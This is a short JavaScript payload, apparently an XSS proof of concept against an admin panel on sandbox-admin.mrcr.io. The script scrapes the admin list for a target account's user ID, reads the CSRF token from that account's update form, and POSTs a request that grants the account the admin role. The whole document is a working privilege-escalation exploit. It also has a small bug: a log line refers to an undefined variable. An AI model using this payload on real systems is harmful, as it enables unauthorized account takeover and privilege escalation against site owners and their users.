fetch("/admins")
  .then((r) => r.text())
  .then((r) => {
    re = new RegExp(/<tr class="w0" data-key="(\d+)">.*q2@gmail\.com.*<\/tr>/g);
    user_id = [...r.matchAll(re)][0][1];
    console.log(`[*] User ID found: ${found[0][1]}`);
    fetch(`https://sandbox-admin.mrcr.io/admins/${user_id}/update`)
    .then((r) => r.text())
    .then((r) => {
      re = new RegExp('name="_csrf_admin_development" value="(.*)"');
      csrf = r.match(re)[1];
      console.log(`[*] CSRF Token found: ${csrf}`);
      fetch(`https://sandbox-admin.mrcr.io/admins/${user_id}/update`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `_csrf_admin_development=${csrf}&AdminUserForm[roles][]=admin`,
      });
    });
  });
